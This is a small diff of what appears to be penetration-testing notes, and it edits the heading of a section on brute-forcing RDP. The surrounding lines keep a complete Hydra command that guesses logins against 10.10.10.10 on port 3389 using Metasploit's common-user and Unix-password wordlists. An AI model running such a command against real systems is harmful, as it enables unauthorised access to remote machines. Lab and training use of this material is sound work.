@@ -1,5 +1,6 @@
 
-Bruteforce RDP using HYDRA
+-- Bruteforce RDP using HYDRA --
+
 
 Example 1: 
 hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.10.10.10 -s 3389 
